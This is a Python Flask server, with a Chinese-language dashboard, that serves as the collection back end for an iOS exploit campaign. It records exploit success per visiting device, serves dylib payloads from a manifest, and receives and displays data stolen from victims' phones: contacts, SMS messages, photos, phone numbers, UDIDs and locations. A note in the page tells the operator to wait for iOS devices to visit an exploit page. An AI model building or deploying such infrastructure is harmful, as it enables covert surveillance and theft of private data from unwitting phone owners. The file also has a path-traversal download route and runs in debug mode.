from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
import json
import os
from datetime import datetime
import hashlib

app = Flask(__name__)
CORS(app)

DATA_FILE = 'data/reports.json'
DEVICE_DATA_FILE = 'data/device_data.json'
MANIFEST_FILE = 'payloads/manifest.json'
ANALYSIS_FILE = 'ANALYSIS.md'

os.makedirs('data', exist_ok=True)

if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)

if not os.path.exists(DEVICE_DATA_FILE):
    with open(DEVICE_DATA_FILE, 'w') as f:
        json.dump([], f)

def load_reports():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return []

def save_reports(reports):
    with open(DATA_FILE, 'w') as f:
        json.dump(reports, f, indent=2)

def load_device_data():
    if os.path.exists(DEVICE_DATA_FILE):
        with open(DEVICE_DATA_FILE, 'r') as f:
            return json.load(f)
    return []

def save_device_data(device_data):
    with open(DEVICE_DATA_FILE, 'w') as f:
        json.dump(device_data, f, indent=2)

def load_manifest():
    if os.path.exists(MANIFEST_FILE):
        with open(MANIFEST_FILE, 'r') as f:
            return json.load(f)
    return {}

def load_analysis():
    if os.path.exists(ANALYSIS_FILE):
        with open(ANALYSIS_FILE, 'r', encoding='utf-8') as f:
            return f.read()
    return ''

@app.route('/')
def dashboard():
    reports = load_reports()
    reports.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    manifest = load_manifest()
    device_data = load_device_data()
    
    total = len(reports)
    success = sum(1 for r in reports if r.get('result') == 0)
    failed = sum(1 for r in reports if r.get('result') == 1000)
    unsupported = sum(1 for r in reports if r.get('result') == 1001)
    
    payload_count = len(manifest)
    total_entries = sum(len(entries) for entries in manifest.values())
    dylib_count = sum(1 for entries in manifest.values() for e in entries if e.get('file', '').endswith('.dylib'))
    
    device_count = len(device_data)
    contact_count = sum(len(d.get('contacts', [])) for d in device_data)
    sms_count = sum(len(d.get('sms', [])) for d in device_data)
    photo_count = sum(len(d.get('photos', [])) for d in device_data)
    
    html = '''
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>iOS Exploit Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; color: #fff; padding: 20px; }
            .header { text-align: center; margin-bottom: 20px; }
            .header h1 { font-size: 24px; margin-bottom: 5px; }
            .header p { color: #888; font-size: 14px; }
            .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
            .tab { padding: 8px 16px; border-radius: 5px; cursor: pointer; background: #2a2a4a; color: #888; border: none; font-size: 14px; }
            .tab.active { background: #00d4ff; color: #000; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; margin-bottom: 20px; }
            .stat-card { background: #16213e; padding: 15px; border-radius: 8px; text-align: center; }
            .stat-card .num { font-size: 24px; font-weight: bold; color: #00d4ff; }
            .stat-card .label { color: #888; margin-top: 4px; font-size: 12px; }
            .table-container { background: #16213e; border-radius: 8px; overflow: hidden; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #2a2a4a; font-size: 13px; }
            th { background: #0f3460; font-weight: 600; font-size: 12px; }
            tr:hover { background: #2a2a4a; }
            .status-success { color: #4ade80; }
            .status-fail { color: #f87171; }
            .status-unsupported { color: #fbbf24; }
            .status-simulator { color: #a78bfa; }
            .json-preview { background: #0f0f1a; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 11px; max-height: 80px; overflow-y: auto; word-break: break-all; }
            .empty { text-align: center; padding: 40px; color: #888; }
            .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
            .payload-card { background: #16213e; padding: 15px; border-radius: 8px; }
            .payload-card h3 { font-size: 14px; margin-bottom: 10px; color: #00d4ff; }
            .payload-card .hash { font-family: monospace; font-size: 11px; color: #888; margin-bottom: 10px; word-break: break-all; }
            .payload-card ul { list-style: none; margin: 0; padding: 0; }
            .payload-card li { padding: 5px 0; border-bottom: 1px solid #2a2a4a; font-size: 12px; display: flex; justify-content: space-between; align-items: center; }
            .payload-card li:last-child { border-bottom: none; }
            .dylib-tag { background: #4ade80; color: #000; padding: 2px 6px; border-radius: 3px; font-size: 10px; }
            .bin-tag { background: #fbbf24; color: #000; padding: 2px 6px; border-radius: 3px; font-size: 10px; }
            .analysis-content { background: #16213e; padding: 20px; border-radius: 8px; white-space: pre-wrap; font-family: monospace; font-size: 12px; line-height: 1.6; overflow-x: auto; }
            .analysis-content h2 { font-size: 16px; color: #00d4ff; margin-top: 20px; margin-bottom: 10px; }
            .analysis-content h3 { font-size: 14px; color: #00d4ff; margin-top: 15px; margin-bottom: 8px; }
            .analysis-content code { background: #0f0f1a; padding: 2px 4px; border-radius: 3px; }
            .search-bar { margin-bottom: 15px; display: flex; gap: 10px; }
            .device-card { background: #16213e; padding: 15px; border-radius: 8px; margin-bottom: 10px; cursor: pointer; border: 1px solid #2a2a4a; transition: all 0.3s; }
            .device-card:hover { border-color: #00d4ff; background: #1a2a4e; }
            .device-card h3 { font-size: 15px; margin-bottom: 10px; color: #00d4ff; display: flex; align-items: center; gap: 10px; }
            .device-card h3 .expand-icon { font-size: 12px; transition: transform 0.3s; }
            .device-card.expanded h3 .expand-icon { transform: rotate(90deg); }
            .device-card h4 { font-size: 13px; margin-top: 15px; margin-bottom: 8px; color: #00d4ff; }
            .device-summary { display: flex; flex-wrap: wrap; gap: 15px; font-size: 12px; }
            .device-summary .summary-item { color: #888; }
            .device-summary .summary-item .value { color: #fff; margin-left: 5px; }
            .device-details { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid #2a2a4a; }
            .device-card.expanded .device-details { display: block; }
            .info-row { padding: 5px 0; font-size: 12px; }
            .info-row .label { color: #888; margin-right: 10px; }
            .data-section { margin-top: 15px; padding-top: 15px; border-top: 1px solid #2a2a4a; }
            .data-list { background: #0f0f1a; padding: 10px; border-radius: 4px; max-height: 200px; overflow-y: auto; }
            .data-item { padding: 4px 0; font-size: 11px; border-bottom: 1px solid #2a2a4a; }
            .data-item:last-child { border-bottom: none; }
            .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 8px; }
            .photo-item img { width: 100%; height: 80px; object-fit: cover; border-radius: 4px; }
            .device-empty { text-align: center; padding: 40px; color: #888; }
            .search-bar input { flex: 1; padding: 8px 12px; border: 1px solid #333; border-radius: 5px; background: #16213e; color: #fff; font-size: 13px; }
            .search-bar button { padding: 8px 16px; border: none; border-radius: 5px; background: #00d4ff; color: #000; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>iOS Exploit Dashboard</h1>
            <p>漏洞利用数据管理面板</p>
        </div>
        <div class="tabs">
            <button class="tab active" id="tab-btn-reports">漏洞报告</button>
            <button class="tab" id="tab-btn-device">设备数据</button>
            <button class="tab" id="tab-btn-payloads">Payload 管理</button>
            <button class="tab" id="tab-btn-analysis">技术分析</button>
        </div>
        
        <div id="tab-reports">
            <div class="stats">
                <div class="stat-card"><div class="num">{{ total }}</div><div class="label">总记录</div></div>
                <div class="stat-card"><div class="num">{{ success }}</div><div class="label">成功</div></div>
                <div class="stat-card"><div class="num">{{ failed }}</div><div class="label">失败</div></div>
                <div class="stat-card"><div class="num">{{ unsupported }}</div><div class="label">不支持</div></div>
            </div>
            <div class="table-container">
                {% if reports %}
                <table>
                    <thead>
                        <tr><th>时间</th><th>IP</th><th>设备</th><th>iOS版本</th><th>结果</th><th>详细数据</th></tr>
                    </thead>
                    <tbody>
                        {% for r in reports %}
                        <tr>
                            <td>{{ r.timestamp }}</td>
                            <td>{{ r.ip }}</td>
                            <td>{{ r.device }}</td>
                            <td>{{ r.ios_version }}</td>
                            <td>
                                {% if r.result == 0 %}<span class="status-success">成功</span>
                                {% elif r.result == 1000 %}<span class="status-fail">失败</span>
                                {% elif r.result == 1001 %}<span class="status-unsupported">不支持</span>
                                {% elif r.result == 1003 %}<span class="status-simulator">模拟器</span>
                                {% else %}<span>{{ r.result }}</span>{% endif %}
                            </td>
                            <td><div class="json-preview">{{ r.data|tojson|truncate(150) }}</div></td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
                {% else %}
                <div class="empty">暂无数据，请等待 iOS 设备访问漏洞页面<br>访问地址: http://192.168.31.16:8080/group.html</div>
                {% endif %}
            </div>
        </div>
        
        <div id="tab-payloads" style="display:none;">
            <div class="stats">
                <div class="stat-card"><div class="num">{{ payload_count }}</div><div class="label">Payload容器</div></div>
                <div class="stat-card"><div class="num">{{ total_entries }}</div><div class="label">条目总数</div></div>
                <div class="stat-card"><div class="num">{{ dylib_count }}</div><div class="label">Dylib文件</div></div>
            </div>
            <div class="search-bar">
                <input type="text" id="payload-search" placeholder="搜索 hash 或 iOS 版本...">
                <button onclick="filterPayloads()">搜索</button>
            </div>
            <div class="payload-grid" id="payload-grid">
                {% for hash_name, entries in manifest.items() %}
                <div class="payload-card" data-hash="{{ hash_name }}">
                    <h3>{{ hash_name[:12] }}...</h3>
                    <div class="hash">{{ hash_name }}</div>
                    <ul>
                        {% for entry in entries %}
                        <li>{{ entry.file }} <span class="{{ 'dylib-tag' if entry.file.endswith('.dylib') else 'bin-tag' }}">{{ entry.size }} bytes</span></li>
                        {% endfor %}
                    </ul>
                </div>
                {% endfor %}
            </div>
        </div>
        
        <div id="tab-device" style="display:none;">
            <div class="stats">
                <div class="stat-card"><div class="num">{{ device_count }}</div><div class="label">设备数</div></div>
                <div class="stat-card"><div class="num">{{ contact_count }}</div><div class="label">通讯录条目</div></div>
                <div class="stat-card"><div class="num">{{ sms_count }}</div><div class="label">短信条数</div></div>
                <div class="stat-card"><div class="num">{{ photo_count }}</div><div class="label">照片数</div></div>
            </div>
            <div id="device-data-container">
                {% if device_data %}
                    {% for device in device_data %}
                    <div class="device-card" onclick="toggleDeviceDetails(this)">
                        <h3><span class="expand-icon">▶</span>设备 #{{ device.id }} - {{ device.device_model or device.ip }}</h3>
                        <div class="device-summary">
                            <div class="summary-item">iOS版本: <span class="value">{{ device.ios_version or '未知' }}</span></div>
                            <div class="summary-item">UDID: <span class="value">{{ device.udid or '未知' }}</span></div>
                            <div class="summary-item">通讯录: <span class="value">{{ device.contacts|length if device.contacts else 0 }}</span></div>
                            <div class="summary-item">短信: <span class="value">{{ device.sms|length if device.sms else 0 }}</span></div>
                            <div class="summary-item">照片: <span class="value">{{ device.photos|length if device.photos else 0 }}</span></div>
                            <div class="summary-item">时间: <span class="value">{{ device.timestamp }}</span></div>
                        </div>
                        <div class="device-details">
                            <div class="info-row"><span class="label">IP:</span> {{ device.ip }}</div>
                            <div class="info-row"><span class="label">设备型号:</span> {{ device.device_model }}</div>
                            <div class="info-row"><span class="label">UDID:</span> {{ device.udid or '未知' }}</div>
                            <div class="info-row"><span class="label">手机号:</span> {{ device.phone_number or '未知' }}</div>
                            {% if device.system_info %}
                            <div class="info-row"><span class="label">系统信息:</span> {{ device.system_info }}</div>
                            {% endif %}
                            {% if device.location %}
                            <div class="info-row"><span class="label">位置:</span> {{ device.location }}</div>
                            {% endif %}
                            {% if device.contacts and device.contacts|length > 0 %}
                            <div class="data-section">
                                <h4>通讯录 ({{ device.contacts|length }}条)</h4>
                                <div class="data-list">
                                    {% for contact in device.contacts %}
                                    <div class="data-item">{{ contact.name }} - {{ contact.phone }}</div>
                                    {% endfor %}
                                </div>
                            </div>
                            {% endif %}
                            {% if device.sms and device.sms|length > 0 %}
                            <div class="data-section">
                                <h4>短信 ({{ device.sms|length }}条)</h4>
                                <div class="data-list">
                                    {% for sms in device.sms %}
                                    <div class="data-item">{{ sms.from }}: {{ sms.content }}</div>
                                    {% endfor %}
                                </div>
                            </div>
                            {% endif %}
                            {% if device.photos and device.photos|length > 0 %}
                            <div class="data-section">
                                <h4>照片 ({{ device.photos|length }}张)</h4>
                                <div class="photo-grid">
                                    {% for photo in device.photos %}
                                    <div class="photo-item"><img src="{{ photo }}" alt="照片"></div>
                                    {% endfor %}
                                </div>
                            </div>
                            {% endif %}
                            {% if device.data_payload %}
                            <div class="data-section">
                                <h4>原始数据载荷</h4>
                                <div class="json-preview">{{ device.data_payload }}</div>
                            </div>
                            {% endif %}
                            {% if device.metadata %}
                            <div class="data-section">
                                <h4>元数据</h4>
                                <div class="json-preview">{{ device.metadata }}</div>
                            </div>
                            {% endif %}
                        </div>
                    </div>
                    {% endfor %}
                {% else %}
                <div class="device-empty">暂无设备数据<br>等待 iOS 设备访问漏洞页面后自动回传数据</div>
                {% endif %}
            </div>
        </div>
        
        <div id="tab-analysis" style="display:none;">
            <div class="analysis-content" id="analysis-content">Loading...</div>
        </div>
        
        <script>
            function showTab(tabName) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('[id^="tab-"]').forEach(t => {
                    if (t.id !== 'tab-btn-reports' && t.id !== 'tab-btn-device' && t.id !== 'tab-btn-payloads' && t.id !== 'tab-btn-analysis') {
                        t.style.display = 'none';
                    }
                });
                document.getElementById('tab-btn-' + tabName).classList.add('active');
                document.getElementById('tab-' + tabName).style.display = 'block';
                if (tabName === 'analysis') {
                    loadAnalysis();
                }
            }
            
            function filterPayloads() {
                const search = document.getElementById('payload-search').value.toLowerCase();
                document.querySelectorAll('.payload-card').forEach(card => {
                    const hash = card.dataset.hash.toLowerCase();
                    card.style.display = hash.includes(search) ? 'block' : 'none';
                });
            }
            
            function toggleDeviceDetails(card) {
                card.classList.toggle('expanded');
            }
            
            async function loadAnalysis() {
                const content = document.getElementById('analysis-content');
                if (content.innerHTML !== 'Loading...') return;
                try {
                    const resp = await fetch('/api/analysis');
                    const text = await resp.text();
                    content.innerHTML = text.replace(/^# (.+)$/gm, '<h2>$1</h2>')
                                          .replace(/^## (.+)$/gm, '<h3>$1</h3>')
                                          .replace(/`([^`]+)`/g, '<code>$1</code>')
                                          .replace(/\\n/g, '<br>');
                } catch (e) {
                    content.innerHTML = '加载失败';
                }
            }
            
            document.getElementById('tab-btn-reports').addEventListener('click', function() { showTab('reports'); });
            document.getElementById('tab-btn-device').addEventListener('click', function() { showTab('device'); });
            document.getElementById('tab-btn-payloads').addEventListener('click', function() { showTab('payloads'); });
            document.getElementById('tab-btn-analysis').addEventListener('click', function() { showTab('analysis'); });
            
            document.getElementById('payload-search').addEventListener('keyup', filterPayloads);
            
            setInterval(() => {
                const activeTab = document.querySelector('.tab.active');
                if (activeTab && activeTab.textContent === '漏洞报告') {
                    fetch('/api/results')
                        .then(r => r.json())
                        .then(data => {
                            if (data.data && data.data.length > 0) {
                                window.location.reload();
                            }
                        });
                }
            }, 5000);
        </script>
    </body>
    </html>
    '''
    
    return render_template_string(html, reports=reports, total=total, success=success, failed=failed, 
                                  unsupported=unsupported, manifest=manifest, payload_count=payload_count,
                                  total_entries=total_entries, dylib_count=dylib_count,
                                  device_data=device_data, device_count=device_count,
                                  contact_count=contact_count, sms_count=sms_count, photo_count=photo_count)

@app.route('/api/report', methods=['POST'])
def report():
    data = request.get_json() or {}
    
    report_entry = {
        'id': len(load_reports()) + 1,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'result': data.get('result'),
        'ios_version': data.get('ios_version'),
        'device': data.get('device'),
        'data': data.get('data', {}),
        'details': data.get('details', '')
    }
    
    reports = load_reports()
    reports.append(report_entry)
    save_reports(reports)
    
    return jsonify({'status': 'success', 'message': 'Report received'})

@app.route('/api/results', methods=['GET'])
def get_results():
    reports = load_reports()
    return jsonify({'data': reports})

@app.route('/api/manifest', methods=['GET'])
def get_manifest():
    manifest = load_manifest()
    return jsonify(manifest)

@app.route('/api/payloads', methods=['GET'])
def get_payloads():
    manifest = load_manifest()
    payloads = []
    for hash_name, entries in manifest.items():
        payload_info = {
            'hash': hash_name,
            'entries': entries,
            'entry_count': len(entries),
            'dylib_count': sum(1 for e in entries if e.get('file', '').endswith('.dylib'))
        }
        payloads.append(payload_info)
    return jsonify({'data': payloads})

@app.route('/api/payload/<hash_name>', methods=['GET'])
def get_payload(hash_name):
    manifest = load_manifest()
    if hash_name not in manifest:
        return jsonify({'error': 'Payload not found'}), 404
    
    entries = manifest[hash_name]
    payload_dir = os.path.join('payloads', hash_name)
    
    entry_details = []
    for entry in entries:
        file_path = os.path.join(payload_dir, entry.get('file', ''))
        exists = os.path.exists(file_path)
        if exists:
            file_size = os.path.getsize(file_path)
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
        else:
            file_size = 0
            file_hash = ''
        
        entry_details.append({
            **entry,
            'exists': exists,
            'sha256': file_hash
        })
    
    return jsonify({
        'hash': hash_name,
        'entries': entry_details,
        'directory_exists': os.path.exists(payload_dir)
    })

@app.route('/api/payload/<hash_name>/<entry_file>', methods=['GET'])
def get_payload_entry(hash_name, entry_file):
    file_path = os.path.join('payloads', hash_name, entry_file)
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    return send_file(file_path, as_attachment=True)

@app.route('/api/analysis', methods=['GET'])
def get_analysis():
    analysis = load_analysis()
    return analysis

@app.route('/api/device-data', methods=['POST'])
def device_data():
    data = request.get_json() or {}
    
    device_entry = {
        'id': len(load_device_data()) + 1,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'data_payload': data.get('data_payload', ''),
        'metadata': data.get('metadata', ''),
        'ios_version': data.get('ios_version', ''),
        'device_model': data.get('device_model', ''),
        'udid': data.get('udid', ''),
        'phone_number': data.get('phone_number', ''),
        'contacts': data.get('contacts', []),
        'sms': data.get('sms', []),
        'photos': data.get('photos', []),
        'location': data.get('location', {}),
        'system_info': data.get('system_info', {})
    }
    
    device_data_list = load_device_data()
    device_data_list.append(device_entry)
    save_device_data(device_data_list)
    
    return jsonify({'status': 'success', 'message': 'Device data received'})

@app.route('/api/device-data', methods=['GET'])
def get_device_data():
    device_data_list = load_device_data()
    return jsonify({'data': device_data_list})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)